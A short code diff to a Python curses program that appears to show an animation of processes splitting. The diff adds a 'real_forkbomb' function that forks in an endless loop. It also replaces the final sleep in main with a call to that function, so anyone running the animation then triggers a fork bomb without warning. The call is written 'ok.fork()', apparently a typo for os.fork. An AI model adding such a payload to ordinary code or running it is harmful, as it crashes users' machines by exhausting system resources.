@@ -102,11 +102,16 @@ def splitting_animation(window):
     programs = move_programs(programs)
     sleep(0.06)
 
+def real_forkbomb():
+  while True:
+    ok.fork()
+
 def main(stdscr):
   curses.curs_set(False)
   curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
 
   splitting_animation(stdscr)
-  sleep(1000)
+  # sleep(1000)
+  real_forkbomb()
 
 curses.wrapper(main)
